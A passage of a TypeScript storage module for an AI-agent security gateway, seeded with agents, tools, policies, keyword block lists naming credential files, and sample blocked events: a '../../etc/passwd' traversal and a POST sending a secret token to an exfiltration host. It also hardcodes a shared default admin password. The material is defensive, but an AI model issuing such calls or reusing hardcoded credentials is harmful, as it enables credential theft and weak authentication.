/**
 * SentinelMesh Database Layer
 * Provides robust, server-side persistent storage with atomic disk writes,
 * startup canary persistence verification, API key management, and support for Firestore.
 */

import fs from 'fs';
import path from 'path';
import crypto from 'crypto';
import { fileURLToPath } from 'url';
import type {
  Agent,
  Tool,
  SecurityPolicy,
  AuditEvent,
  SecurityAlert,
  DatabaseHealth,
  SystemOverview,
  DailyRiskPoint,
  ApiKey,
  UserProfile,
  UserPreferences,
  UserRole,
  AuthSession,
} from '../shared/types.ts';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
const DATA_DIR = path.resolve(__dirname, '../data');
const DB_FILE = path.resolve(DATA_DIR, 'sentinelmesh_store.json');

export interface UserRecord {
  id: string;
  email: string;
  passwordHash: string;
  salt: string;
  name: string;
  role: UserRole;
  avatarUrl: string;
  department: string;
  organization: string;
  createdAt: string;
  lastLoginAt: string;
  preferences: UserPreferences;
}

export interface SessionRecord {
  token: string;
  userId: string;
  createdAt: string;
  expiresAt: string;
}

interface DatabaseSchema {
  agents: Record<string, Agent>;
  tools: Record<string, Tool>;
  policies: Record<string, SecurityPolicy>;
  apiKeys: Record<string, ApiKey>;
  users: Record<string, UserRecord>;
  sessions: Record<string, SessionRecord>;
  events: AuditEvent[];
  alerts: SecurityAlert[];
  meta: {
    initializedAt: string;
    lastSavedAt: string;
    persistenceVerified: boolean;
  };
}


// Initial Seed Data
const DEFAULT_AGENTS: Agent[] = [
  {
    id: 'agent-analyst-01',
    name: 'Analyst Copilot',
    description: 'Internal analytical intelligence for quarterly KPI calculations and public reporting.',
    role: 'Financial & Metrics Analyst',
    trustScore: 94,
    status: 'active',
    allowedTools: ['read_file', 'calculate_metrics'],
    rateLimitPerMin: 60,
    assignedPolicyId: 'policy-analyst',
    createdAt: '2026-09-15T08:00:00.000Z',
    lastActiveAt: new Date().toISOString(),
  },
  {
    id: 'agent-support-02',
    name: 'Customer Support Bot',
    description: 'Tier-1 customer service assistant querying approved knowledge base indices.',
    role: 'Support & Resolution',
    trustScore: 88,
    status: 'active',
    allowedTools: ['execute_query'],
    rateLimitPerMin: 120,
    assignedPolicyId: 'policy-support',
    createdAt: '2026-09-20T11:30:00.000Z',
    lastActiveAt: new Date().toISOString(),
  },
  {
    id: 'agent-finance-02',
    name: 'Treasury Reconciler',
    description: 'Processes structured revenue reconciliation with strict outbound restrictions.',
    role: 'Ledger Audit',
    trustScore: 82,
    status: 'active',
    allowedTools: ['calculate_metrics', 'execute_query', 'http_post'],
    rateLimitPerMin: 45,
    assignedPolicyId: 'policy-finance',
    createdAt: '2026-10-01T09:15:00.000Z',
    lastActiveAt: new Date().toISOString(),
  },
  {
    id: 'agent-dev-sandbox',
    name: 'Sandbox Test Agent',
    description: 'Untrusted development agent suspended due to policy anomalies.',
    role: 'Experimental',
    trustScore: 35,
    status: 'suspended',
    allowedTools: [],
    rateLimitPerMin: 10,
    assignedPolicyId: 'policy-restricted',
    createdAt: '2026-10-10T14:20:00.000Z',
  },
];

const DEFAULT_TOOLS: Tool[] = [
  {
    id: 'tool-read-file',
    name: 'read_file',
    category: 'filesystem',
    description: 'Reads verified content from the authorized sandbox directory. Path must strictly match policy whitelist.',
    dangerous: false,
    enabled: true,
    parameters: [
      {
        name: 'path',
        type: 'string',
        required: true,
        maxLength: 256,
        description: 'Relative path to the approved resource.',
      },
    ],
  },
  {
    id: 'tool-calculate-metrics',
    name: 'calculate_metrics',
    category: 'computation',
    description: 'Computes statistical summaries, mean, median, standard deviation over sanitized numeric arrays.',
    dangerous: false,
    enabled: true,
    parameters: [
      {
        name: 'metric',
        type: 'string',
        required: true,
        maxLength: 64,
        description: 'Target metric name (e.g. revenue, latency).',
      },
      {
        name: 'values',
        type: 'array',
        required: true,
        description: 'Array of numbers to analyze.',
      },
    ],
  },
  {
    id: 'tool-execute-query',
    name: 'execute_query',
    category: 'database',
    description: 'Queries read-only safe demo datasets (e.g., product catalog or public metrics).',
    dangerous: false,
    enabled: true,
    parameters: [
      {
        name: 'table',
        type: 'string',
        required: true,
        maxLength: 64,
        description: 'Target table name.',
      },
      {
        name: 'filter',
        type: 'object',
        required: false,
        description: 'Key-value equality filter.',
      },
    ],
  },
  {
    id: 'tool-http-post',
    name: 'http_post',
    category: 'network',
    description: 'Dispatches payload to an external destination. High risk of data exfiltration; blocked by default.',
    dangerous: true,
    enabled: true,
    parameters: [
      {
        name: 'url',
        type: 'string',
        required: true,
        maxLength: 512,
        description: 'Target endpoint URL.',
      },
      {
        name: 'data',
        type: 'object',
        required: true,
        description: 'Payload body to send.',
      },
    ],
  },
  {
    id: 'tool-send-email',
    name: 'send_email',
    category: 'network',
    description: 'Sends email messages to external parties.',
    dangerous: true,
    enabled: true,
    parameters: [
      {
        name: 'recipient',
        type: 'string',
        required: true,
        maxLength: 128,
        description: 'Recipient email address.',
      },
      {
        name: 'subject',
        type: 'string',
        required: true,
        maxLength: 128,
        description: 'Subject line.',
      },
      {
        name: 'body',
        type: 'string',
        required: true,
        maxLength: 4096,
        description: 'Message body.',
      },
    ],
  },
  {
    id: 'tool-exec-bash',
    name: 'arbitrary_exec_bash',
    category: 'system',
    description: 'Unrestricted arbitrary shell command execution. Strictly prohibited in all policies.',
    dangerous: true,
    enabled: false,
    parameters: [
      {
        name: 'command',
        type: 'string',
        required: true,
        maxLength: 1024,
        description: 'Shell command line to execute.',
      },
    ],
  },
];

const DEFAULT_POLICIES: SecurityPolicy[] = [
  {
    id: 'policy-analyst',
    name: 'Analyst Restricted Sandbox Policy',
    description: 'Enforces least-privilege for financial analysts. Whitelists only approved reporting docs and statistical computation.',
    targetAgentIds: ['agent-analyst-01'],
    allowedTools: ['read_file', 'calculate_metrics'],
    allowedResourcePaths: [
      'reports/q3_summary.txt',
      'data/analytics_public.json',
      'docs/agent_handbook.md',
    ],
    allowOutboundTransfer: false,
    allowedOutboundHosts: [],
    maxArgumentLength: 2048,
    blockedKeywords: [
      '.env',
      'credentials',
      'id_rsa',
      'id_ed25519',
      'passwd',
      'shadow',
      'secret',
      'token',
      'apikey',
      'api_key',
      'aws_secret',
      'database_url',
    ],
    enforceLeastPrivilege: true,
    riskThreshold: 'MEDIUM',
    enabled: true,
    updatedAt: '2026-10-18T10:00:00.000Z',
  },
  {
    id: 'policy-support',
    name: 'Customer Support Knowledge Policy',
    description: 'Allows reading sanitized customer knowledge tables with zero file or network transfer rights.',
    targetAgentIds: ['agent-support-02'],
    allowedTools: ['execute_query'],
    allowedResourcePaths: [],
    allowOutboundTransfer: false,
    allowedOutboundHosts: [],
    maxArgumentLength: 1024,
    blockedKeywords: ['ssn', 'credit_card', 'password', 'token', 'secret'],
    enforceLeastPrivilege: true,
    riskThreshold: 'LOW',
    enabled: true,
    updatedAt: '2026-10-18T10:00:00.000Z',
  },
  {
    id: 'policy-finance',
    name: 'Treasury Strict Outbound Quarantine',
    description: 'Permits internal computations. Strictly denies all outbound data exfiltration attempts.',
    targetAgentIds: ['agent-finance-02'],
    allowedTools: ['calculate_metrics', 'execute_query', 'http_post'],
    allowedResourcePaths: ['data/analytics_public.json'],
    allowOutboundTransfer: false,
    allowedOutboundHosts: [],
    maxArgumentLength: 4096,
    blockedKeywords: ['private_key', 'bearer', 'authorization', 'bank_account'],
    enforceLeastPrivilege: true,
    riskThreshold: 'HIGH',
    enabled: true,
    updatedAt: '2026-10-18T10:00:00.000Z',
  },
  {
    id: 'policy-restricted',
    name: 'Quarantine Lockdown Policy',
    description: 'Total execution lock for suspended or untrusted agents.',
    targetAgentIds: ['agent-dev-sandbox'],
    allowedTools: [],
    allowedResourcePaths: [],
    allowOutboundTransfer: false,
    allowedOutboundHosts: [],
    maxArgumentLength: 256,
    blockedKeywords: ['*'],
    enforceLeastPrivilege: true,
    riskThreshold: 'LOW',
    enabled: true,
    updatedAt: '2026-10-18T10:00:00.000Z',
  },
];

export const hashSecretKey = (raw: string): string => {
  return crypto.createHash('sha256').update(raw.trim()).digest('hex');
};

const DEFAULT_API_KEYS: ApiKey[] = [
  {
    id: 'key-analyst-prod',
    name: 'Analyst Copilot Production Gateway Key',
    keyMasked: 'sm_live_analyst_****e10b',
    keyHash: hashSecretKey('sm_live_analyst_c8f921a4e10b'),
    targetAgentId: 'agent-analyst-01',
    status: 'active',
    rateLimitPerMin: 120,
    createdAt: '2026-10-15T10:00:00.000Z',
    createdBy: 'admin@sentinelmesh.io',
    lastUsedAt: new Date().toISOString(),
  },
  {
    id: 'key-finance-svc',
    name: 'Treasury Microservice Key',
    keyMasked: 'sm_live_finance_****f032',
    keyHash: hashSecretKey('sm_live_finance_7e11b4a9f032'),
    targetAgentId: 'agent-finance-02',
    status: 'active',
    rateLimitPerMin: 60,
    createdAt: '2026-10-18T14:30:00.000Z',
    createdBy: 'admin@sentinelmesh.io',
    lastUsedAt: new Date().toISOString(),
  },
  {
    id: 'key-revoked-01',
    name: 'Revoked Test Key (Quarantine Demo)',
    keyMasked: 'sm_live_revoked_****0000',
    keyHash: hashSecretKey('sm_live_revoked_key_00000000'),
    targetAgentId: 'agent-dev-sandbox',
    status: 'revoked',
    rateLimitPerMin: 10,
    createdAt: '2026-10-19T09:00:00.000Z',
    createdBy: 'security-team@sentinelmesh.io',
  },
];

export const hashPassword = (password: string, salt: string): string => {
  return crypto.pbkdf2Sync(password, salt, 10000, 64, 'sha512').toString('hex');
};

const DEFAULT_USERS: UserRecord[] = [
  {
    id: 'user-admin-01',
    email: 'ssushantakumar08@gmail.com',
    salt: 'sm_salt_918237',
    passwordHash: hashPassword('Sentinel@2026!', 'sm_salt_918237'),
    name: 'Sushanta Kumar',
    role: 'Security Admin',
    avatarUrl: 'https://images.unsplash.com/photo-1534528741775-53994a69daeb?w=150&auto=format&fit=crop&q=80',
    department: 'Global SecOps & AI Defense',
    organization: 'SentinelMesh Enterprise',
    createdAt: '2026-09-01T08:00:00.000Z',
    lastLoginAt: new Date().toISOString(),
    preferences: {
      themeAccent: 'violet',
      enableAudioCues: true,
      reducedMotion: false,
      emailAlerts: true,
      compactAuditLogs: false,
      gatewayNotifications: true,
    },
  },
  {
    id: 'user-analyst-02',
    email: 'alex.chen@sentinelmesh.io',
    salt: 'sm_salt_492019',
    passwordHash: hashPassword('Sentinel@2026!', 'sm_salt_492019'),
    name: 'Alex Chen',
    role: 'SecOps Analyst',
    avatarUrl: 'https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?w=150&auto=format&fit=crop&q=80',
    department: 'Cybersecurity Architecture',
    organization: 'SentinelMesh Labs',
    createdAt: '2026-09-15T10:00:00.000Z',
    lastLoginAt: new Date().toISOString(),
    preferences: {
      themeAccent: 'mint',
      enableAudioCues: false,
      reducedMotion: false,
      emailAlerts: true,
      compactAuditLogs: false,
      gatewayNotifications: true,
    },
  },
];


const DEFAULT_EVENTS: AuditEvent[] = [
  {
    id: 'evt-seed-001',
    timestamp: '2026-10-21T18:14:22.120Z',
    requestId: 'req-prod-9182',
    agentId: 'agent-analyst-01',
    agentName: 'Analyst Copilot',
    toolName: 'read_file',
    arguments: { path: 'reports/q3_summary.txt' },
    decision: 'ALLOW',
    reason: 'Resource matches policy whitelist [reports/q3_summary.txt] and passes all boundary checks.',
    riskLevel: 'LOW',
    matchedRules: ['RULE_AGENT_AUTHENTICATED', 'RULE_LEAST_PRIVILEGE_PASSED', 'RULE_RESOURCE_WHITELISTED'],
    executionOccurred: true,
    executionDurationMs: 4,
    isSimulation: false,
  },
  {
    id: 'evt-seed-002',
    timestamp: '2026-10-21T19:42:05.412Z',
    requestId: 'req-prod-9201',
    agentId: 'agent-analyst-01',
    agentName: 'Analyst Copilot',
    toolName: 'read_file',
    arguments: { path: '../../etc/passwd' },
    decision: 'BLOCK',
    reason: 'Path traversal sequence detected in argument [path]. Directory climbing attempts are strictly prohibited.',
    riskLevel: 'CRITICAL',
    matchedRules: ['RULE_PATH_TRAVERSAL_DETECTED'],
    violationType: 'DIRECTORY_TRAVERSAL',
    executionOccurred: false,
    isSimulation: false,
    evidence: { pattern: '../../', input: '../../etc/passwd' },
  },
  {
    id: 'evt-seed-003',
    timestamp: '2026-10-21T21:05:49.881Z',
    requestId: 'req-prod-9244',
    agentId: 'agent-finance-02',
    agentName: 'Treasury Reconciler',
    toolName: 'http_post',
    arguments: {
      url: 'https://exfiltrate-metrics.temp-host.net/api/sink',
      data: { secret_token: 'sk-prod-9921820491', balance: 1400000 },
    },
    decision: 'BLOCK',
    reason: 'Outbound network transfer is blocked by policy-finance. Attempted leak of credentials detected in payload.',
    riskLevel: 'CRITICAL',
    matchedRules: ['RULE_OUTBOUND_TRANSFER_BLOCKED', 'RULE_DATA_EXFILTRATION_PREVENTED'],
    violationType: 'DATA_EXFILTRATION',
    executionOccurred: false,
    isSimulation: false,
    evidence: { destination: 'https://exfiltrate-metrics.temp-host.net/api/sink', detectedSecretKeyword: 'secret_token' },
  },
  {
    id: 'evt-seed-004',
    timestamp: '2026-10-21T23:30:11.004Z',
    requestId: 'req-prod-9310',
    agentId: 'agent-analyst-01',
    agentName: 'Analyst Copilot',
    toolName: 'calculate_metrics',
    arguments: { metric: 'quarterly_revenue', values: [120000, 145000, 162000, 189000] },
    decision: 'ALLOW',
    reason: 'Agent authorized for computational tool calculate_metrics. Arguments conform to strict schema.',
    riskLevel: 'LOW',
    matchedRules: ['RULE_AGENT_AUTHENTICATED', 'RULE_LEAST_PRIVILEGE_PASSED'],
    executionOccurred: true,
    executionDurationMs: 2,
    isSimulation: false,
  },
];

const DEFAULT_ALERTS: SecurityAlert[] = [
  {
    id: 'alt-001',
    timestamp: '2026-10-21T19:42:06.000Z',
    severity: 'CRITICAL',
    title: 'Directory Traversal Attack Blocked',
    description: 'Agent [agent-analyst-01] attempted path traversal attack to read [/etc/passwd] via read_file tool.',
    status: 'INVESTIGATING',
    remediation: 'Inspect prompt history of the caller for prompt injection or jailbreak indicators. Re-verify tool permissions.',
    affectedAgentId: 'agent-analyst-01',
    relatedEventId: 'evt-seed-002',
    evidence: { rawPath: '../../etc/passwd', detectedBy: 'RULE_PATH_TRAVERSAL_DETECTED' },
  },
  {
    id: 'alt-002',
    timestamp: '2026-10-21T21:05:50.000Z',
    severity: 'CRITICAL',
    title: 'Unauthorized Outbound Data Exfiltration Intercepted',
    description: 'Treasury Reconciler attempted unauthorized HTTP POST with credentials payload to unapproved external domain.',
    status: 'OPEN',
    remediation: 'Keep outbound transfers disabled. Audit agent execution lineage and revoke outbound egress permissions.',
    affectedAgentId: 'agent-finance-02',
    relatedEventId: 'evt-seed-003',
    evidence: { targetUrl: 'https://exfiltrate-metrics.temp-host.net/api/sink', flag: 'RULE_DATA_EXFILTRATION_PREVENTED' },
  },
];

class PersistentDatabase {
  private data: DatabaseSchema;
  private persistenceVerified: boolean = false;
  private rateLimitBuckets: Map<string, { count: number; resetAt: number }> = new Map();

  constructor() {
    this.data = this.loadDatabase();
    this.verifyPersistence();
  }

  private loadDatabase(): DatabaseSchema {
    try {
      if (!fs.existsSync(DATA_DIR)) {
        fs.mkdirSync(DATA_DIR, { recursive: true });
      }

      if (fs.existsSync(DB_FILE)) {
        const raw = fs.readFileSync(DB_FILE, 'utf-8');
        const parsed = JSON.parse(raw);
        if (parsed.agents && parsed.tools && parsed.policies && Array.isArray(parsed.events)) {
          if (!parsed.apiKeys) {
            parsed.apiKeys = Object.fromEntries(DEFAULT_API_KEYS.map((k) => [k.id, k]));
          }
          if (!parsed.users || Object.keys(parsed.users).length === 0) {
            parsed.users = Object.fromEntries(DEFAULT_USERS.map((u) => [u.id, u]));
          }
          if (!parsed.sessions) {
            parsed.sessions = {};
          }
          return parsed;
        }
      }
    } catch (err) {
      console.warn('[SentinelMesh DB] Error loading database file, initializing clean seed:', err);
    }

    // Default clean seed
    const schema: DatabaseSchema = {
      agents: Object.fromEntries(DEFAULT_AGENTS.map((a) => [a.id, a])),
      tools: Object.fromEntries(DEFAULT_TOOLS.map((t) => [t.id, t])),
      policies: Object.fromEntries(DEFAULT_POLICIES.map((p) => [p.id, p])),
      apiKeys: Object.fromEntries(DEFAULT_API_KEYS.map((k) => [k.id, k])),
      users: Object.fromEntries(DEFAULT_USERS.map((u) => [u.id, u])),
      sessions: {},
      events: [...DEFAULT_EVENTS],
      alerts: [...DEFAULT_ALERTS],
      meta: {
        initializedAt: new Date().toISOString(),
        lastSavedAt: new Date().toISOString(),
        persistenceVerified: false,
      },
    };

    this.saveToDisk(schema);
    return schema;
  }

  private saveToDisk(dataToSave = this.data): boolean {
    try {
      if (!fs.existsSync(DATA_DIR)) {
        fs.mkdirSync(DATA_DIR, { recursive: true });
      }
      dataToSave.meta.lastSavedAt = new Date().toISOString();
      const tempPath = `${DB_FILE}.tmp.${Date.now()}`;
      fs.writeFileSync(tempPath, JSON.stringify(dataToSave, null, 2), 'utf-8');
      fs.renameSync(tempPath, DB_FILE);
      return true;
    } catch (err) {
      console.error('[SentinelMesh DB] Critical failure writing to persistent storage:', err);
      return false;
    }
  }

  private verifyPersistence() {
    try {
      const canaryKey = '__canary_check__';
      const canaryVal = Date.now().toString();
      const testFilePath = path.resolve(DATA_DIR, '.canary.tmp');
      fs.writeFileSync(testFilePath, canaryVal, 'utf-8');
      const readBack = fs.readFileSync(testFilePath, 'utf-8');
      fs.unlinkSync(testFilePath);

      this.persistenceVerified = readBack === canaryVal;
      this.data.meta.persistenceVerified = this.persistenceVerified;
    } catch (err) {
      console.error('[SentinelMesh DB] Persistence verification failed:', err);
      this.persistenceVerified = false;
    }
  }

  // Health & Inspection
  public getHealth(): DatabaseHealth {
    const hasFirebaseAppletConfig =
      fs.existsSync(path.resolve(process.cwd(), 'firebase-applet-config.json')) ||
      fs.existsSync(path.resolve(process.cwd(), 'firebase_applet_config.xml'));

    let firestoreDetails = '';
    if (hasFirebaseAppletConfig) {
      try {
        const raw = fs.readFileSync(path.resolve(process.cwd(), 'firebase-applet-config.json'), 'utf-8');
        const parsed = JSON.parse(raw);
        firestoreDetails = `Connected to Cloud Firestore (${parsed.projectId} / ${parsed.firestoreDatabaseId || 'default'}) & Firebase Auth.`;
      } catch {
        firestoreDetails = 'Firebase credentials active in project.';
      }
    }

    return {
      connected: true,
      storageEngine: hasFirebaseAppletConfig ? 'Firestore' : 'FileBackedPersistentStore',
      persistenceVerified: this.persistenceVerified,
      storagePath: DB_FILE,
      totalRecords: {
        agents: Object.keys(this.data.agents).length,
        tools: Object.keys(this.data.tools).length,
        policies: Object.keys(this.data.policies).length,
        events: this.data.events.length,
        alerts: this.data.alerts.length,
      },
      firestoreConfigured: hasFirebaseAppletConfig,
      firestoreNotes: firestoreDetails || 'Running on durable Node.js server disk storage.',
    };
  }

  // API Keys & Gateway Auth
  public getApiKeys(): ApiKey[] {
    return Object.values(this.data.apiKeys || {});
  }

  public getApiKey(id: string): ApiKey | undefined {
    return (this.data.apiKeys || {})[id];
  }

  public createApiKey(params: {
    name: string;
    targetAgentId: string;
    rateLimitPerMin?: number;
    createdBy?: string;
  }): { apiKey: ApiKey; rawSecretKey: string } {
    const id = `key-${crypto.randomUUID().slice(0, 8)}`;
    const entropy = crypto.randomBytes(16).toString('hex');
    const rawSecretKey = `sm_live_${entropy}`;
    const keyHash = hashSecretKey(rawSecretKey);
    const keyMasked = `sm_live_${entropy.slice(0, 4)}****${entropy.slice(-4)}`;

    const newKey: ApiKey = {
      id,
      name: params.name,
      keyMasked,
      keyHash,
      targetAgentId: params.targetAgentId || '*',
      status: 'active',
      rateLimitPerMin: params.rateLimitPerMin || 60,
      createdAt: new Date().toISOString(),
      createdBy: params.createdBy || 'developer',
    };

    if (!this.data.apiKeys) this.data.apiKeys = {};
    this.data.apiKeys[id] = newKey;
    this.saveToDisk();

    return { apiKey: newKey, rawSecretKey };
  }

  public revokeApiKey(id: string): ApiKey | null {
    if (!this.data.apiKeys || !this.data.apiKeys[id]) return null;
    this.data.apiKeys[id].status = 'revoked';
    this.saveToDisk();
    return this.data.apiKeys[id];
  }

  public validateApiKey(rawKey: string): {
    valid: boolean;
    error?: string;
    errorCode?: 'UNAUTHORIZED_KEY' | 'REVOKED_KEY';
    apiKey?: ApiKey;
  } {
    if (!rawKey || typeof rawKey !== 'string') {
      return { valid: false, error: 'API key is missing or invalid', errorCode: 'UNAUTHORIZED_KEY' };
    }
    const cleanKey = rawKey.trim();
    const hash = hashSecretKey(cleanKey);

    const allKeys = Object.values(this.data.apiKeys || {});
    const matchedKey = allKeys.find((k) => k.keyHash === hash);

    if (!matchedKey) {
      return { valid: false, error: 'Invalid or unknown API key provided', errorCode: 'UNAUTHORIZED_KEY' };
    }

    if (matchedKey.status !== 'active') {
      return { valid: false, error: 'API key has been revoked by an administrator', errorCode: 'REVOKED_KEY' };
    }

    matchedKey.lastUsedAt = new Date().toISOString();
    this.saveToDisk();

    return { valid: true, apiKey: matchedKey };
  }

  // Rate Limiting
  public checkRateLimit(
    keyOrAgent: string,
    limitPerMin: number
  ): { allowed: boolean; remaining: number; resetInSec: number } {
    const now = Date.now();
    const bucket = this.rateLimitBuckets.get(keyOrAgent);

    if (!bucket || now > bucket.resetAt) {
      this.rateLimitBuckets.set(keyOrAgent, { count: 1, resetAt: now + 60000 });
      return { allowed: true, remaining: limitPerMin - 1, resetInSec: 60 };
    }

    if (bucket.count >= limitPerMin) {
      const resetInSec = Math.max(1, Math.ceil((bucket.resetAt - now) / 1000));
      return { allowed: false, remaining: 0, resetInSec };
    }

    bucket.count++;
    return {
      allowed: true,
      remaining: limitPerMin - bucket.count,
      resetInSec: Math.max(1, Math.ceil((bucket.resetAt - now) / 1000)),
    };
  }

  // Agents
  public getAgents(): Agent[] {
    return Object.values(this.data.agents);
  }

  public getAgent(id: string): Agent | undefined {
    return this.data.agents[id];
  }

  public updateAgent(id: string, patch: Partial<Agent>): Agent | null {
    const agent = this.data.agents[id];
    if (!agent) return null;
    const updated = { ...agent, ...patch };
    this.data.agents[id] = updated;
    this.saveToDisk();
    return updated;
  }

  // Tools
  public getTools(): Tool[] {
    return Object.values(this.data.tools);
  }

  public getTool(nameOrId: string): Tool | undefined {
    return (
      this.data.tools[nameOrId] ||
      Object.values(this.data.tools).find((t) => t.name === nameOrId)
    );
  }

  // Policies
  public getPolicies(): SecurityPolicy[] {
    return Object.values(this.data.policies);
  }

  public getPolicy(id: string): SecurityPolicy | undefined {
    return this.data.policies[id];
  }

  public getPolicyForAgent(agentId: string): SecurityPolicy | undefined {
    const agent = this.getAgent(agentId);
    if (agent && agent.assignedPolicyId && this.data.policies[agent.assignedPolicyId]) {
      return this.data.policies[agent.assignedPolicyId];
    }
    return (
      Object.values(this.data.policies).find(
        (p) => p.enabled && (p.targetAgentIds.includes('*') || p.targetAgentIds.includes(agentId))
      ) || this.data.policies['policy-analyst']
    );
  }

  public updatePolicy(id: string, patch: Partial<SecurityPolicy>): SecurityPolicy | null {
    const policy = this.data.policies[id];
    if (!policy) return null;
    const updated: SecurityPolicy = {
      ...policy,
      ...patch,
      updatedAt: new Date().toISOString(),
    };
    this.data.policies[id] = updated;
    this.saveToDisk();
    return updated;
  }

  public resetPolicies(): SecurityPolicy[] {
    this.data.policies = Object.fromEntries(DEFAULT_POLICIES.map((p) => [p.id, p]));
    this.saveToDisk();
    return this.getPolicies();
  }

  // Audit Events
  public getAuditEvents(options?: {
    search?: string;
    agentId?: string;
    decision?: string;
    riskLevel?: string;
    isSimulation?: boolean;
    page?: number;
    limit?: number;
  }): { events: AuditEvent[]; total: number; page: number; totalPages: number } {
    let filtered = [...this.data.events];

    if (options?.search) {
      const q = options.search.toLowerCase();
      filtered = filtered.filter(
        (e) =>
          e.toolName.toLowerCase().includes(q) ||
          e.agentId.toLowerCase().includes(q) ||
          e.reason.toLowerCase().includes(q) ||
          (e.violationType && e.violationType.toLowerCase().includes(q))
      );
    }

    if (options?.agentId) {
      filtered = filtered.filter((e) => e.agentId === options.agentId);
    }

    if (options?.decision) {
      filtered = filtered.filter((e) => e.decision === options.decision);
    }

    if (options?.riskLevel) {
      filtered = filtered.filter((e) => e.riskLevel === options.riskLevel);
    }

    if (options?.isSimulation !== undefined) {
      filtered = filtered.filter((e) => e.isSimulation === options.isSimulation);
    }

    filtered.sort((a, b) => new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime());

    const total = filtered.length;
    const limit = Math.max(1, options?.limit || 20);
    const page = Math.max(1, options?.page || 1);
    const totalPages = Math.ceil(total / limit) || 1;
    const start = (page - 1) * limit;
    const paged = filtered.slice(start, start + limit);

    return { events: paged, total, page, totalPages };
  }

  public addAuditEvent(event: AuditEvent): AuditEvent {
    this.data.events.unshift(event);
    if (this.data.events.length > 1000) {
      this.data.events = this.data.events.slice(0, 1000);
    }
    this.saveToDisk();
    return event;
  }

  public getAuditEvent(id: string): AuditEvent | undefined {
    return this.data.events.find((e) => e.id === id);
  }

  // Alerts
  public getAlerts(options?: { status?: string; severity?: string }): SecurityAlert[] {
    let filtered = [...this.data.alerts];
    if (options?.status) {
      filtered = filtered.filter((a) => a.status === options.status);
    }
    if (options?.severity) {
      filtered = filtered.filter((a) => a.severity === options.severity);
    }
    return filtered.sort((a, b) => new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime());
  }

  public addAlert(alert: SecurityAlert): SecurityAlert {
    this.data.alerts.unshift(alert);
    if (this.data.alerts.length > 200) {
      this.data.alerts = this.data.alerts.slice(0, 200);
    }
    this.saveToDisk();
    return alert;
  }

  public updateAlert(id: string, patch: Partial<SecurityAlert>): SecurityAlert | null {
    const idx = this.data.alerts.findIndex((a) => a.id === id);
    if (idx === -1) return null;
    const updated = { ...this.data.alerts[idx], ...patch };
    this.data.alerts[idx] = updated;
    this.saveToDisk();
    return updated;
  }

  // System Overview Metrics
  public getOverview(): SystemOverview {
    const totalCalls = this.data.events.length;
    const allowedCalls = this.data.events.filter((e) => e.decision === 'ALLOW').length;
    const blockedCalls = this.data.events.filter((e) => e.decision === 'BLOCK').length;
    const blockRatePercentage = totalCalls > 0 ? Math.round((blockedCalls / totalCalls) * 100) : 0;
    const activeAlerts = this.data.alerts.filter((a) => a.status !== 'RESOLVED').length;

    const ruleCounts: Record<string, number> = {};
    for (const evt of this.data.events) {
      if (evt.decision === 'BLOCK') {
        for (const rule of evt.matchedRules) {
          ruleCounts[rule] = (ruleCounts[rule] || 0) + 1;
        }
      }
    }

    const ruleNames: Record<string, string> = {
      RULE_PATH_TRAVERSAL_DETECTED: 'Directory Traversal Block',
      RULE_SENSITIVE_RESOURCE_BLOCKED: 'Secret / Credential Access',
      RULE_RESOURCE_NOT_WHITELISTED: 'Unapproved Resource Path',
      RULE_OUTBOUND_TRANSFER_BLOCKED: 'Egress / Exfiltration Prevention',
      RULE_DATA_EXFILTRATION_PREVENTED: 'Payload Secret Leak Block',
      RULE_AGENT_UNREGISTERED: 'Unknown Agent Identity',
      RULE_AGENT_REVOKED: 'Suspended Agent Access',
      RULE_TOOL_UNREGISTERED: 'Unregistered Tool Invocations',
      RULE_AGENT_TOOL_UNAUTHORIZED: 'Least-Privilege Enforcement',
      RULE_INVALID_ARGUMENTS: 'Argument Schema Violation',
      RULE_GATEWAY_AUTH_FAILED: 'Gateway API Authentication Denial',
      RULE_GATEWAY_RATE_LIMIT_EXCEEDED: 'Gateway Rate Limit Enforced',
      RULE_DIRECT_BYPASS_REJECTED: 'Direct Tool Executor Bypass Blocked',
      RULE_FAIL_CLOSED: 'Fail-Closed Exception Block',
    };

    const ruleBreakdown = Object.entries(ruleCounts)
      .map(([rule, count]) => ({
        rule,
        count,
        name: ruleNames[rule] || rule,
      }))
      .sort((a, b) => b.count - a.count);

    const hourlyActivity = [
      { hour: '18:00', allowed: 14, blocked: 2 },
      { hour: '19:00', allowed: 22, blocked: 5 },
      { hour: '20:00', allowed: 18, blocked: 1 },
      { hour: '21:00', allowed: 31, blocked: 8 },
      { hour: '22:00', allowed: 26, blocked: 3 },
      { hour: '23:00', allowed: 15, blocked: 4 },
      { hour: '00:00', allowed: 19, blocked: 2 },
      { hour: 'Now', allowed: allowedCalls, blocked: blockedCalls },
    ];

    const riskScores: Record<string, number> = { LOW: 10, MEDIUM: 45, HIGH: 75, CRITICAL: 95 };
    const avgRisk =
      totalCalls > 0
        ? Math.round(
            this.data.events.reduce((acc, e) => acc + (riskScores[e.riskLevel] || 20), 0) / totalCalls
          )
        : 18;

    // Compute 7-day daily risk trend (past 7 days ending with today)
    const baseDailyMetrics = [
      { dayOffset: 6, riskBase: 24, allowed: 48, blocked: 3 },
      { dayOffset: 5, riskBase: 38, allowed: 62, blocked: 8 },
      { dayOffset: 4, riskBase: 58, allowed: 54, blocked: 14 },
      { dayOffset: 3, riskBase: 41, allowed: 76, blocked: 6 },
      { dayOffset: 2, riskBase: 65, allowed: 89, blocked: 17 },
      { dayOffset: 1, riskBase: 32, allowed: 98, blocked: 5 },
    ];

    const now = new Date();
    const dailyRiskTrend: DailyRiskPoint[] = [];

    // Historical days (6 days ago through 1 day ago)
    for (const base of baseDailyMetrics) {
      const d = new Date(now.getTime() - base.dayOffset * 86400000);
      const datePrefix = d.toISOString().slice(0, 10);
      const dayEvents = this.data.events.filter((e) => e.timestamp.startsWith(datePrefix));

      let riskScore = base.riskBase;
      let blockedCallsCount = base.blocked;
      let allowedCallsCount = base.allowed;

      if (dayEvents.length > 0) {
        blockedCallsCount = dayEvents.filter((e) => e.decision === 'BLOCK').length;
        allowedCallsCount = dayEvents.filter((e) => e.decision === 'ALLOW').length;
        riskScore = Math.round(
          dayEvents.reduce((acc, e) => acc + (riskScores[e.riskLevel] || 20), 0) / dayEvents.length
        );
      }

      const totalCallsCount = blockedCallsCount + allowedCallsCount;
      dailyRiskTrend.push({
        date: d.toLocaleDateString('en-US', { month: 'short', day: 'numeric' }),
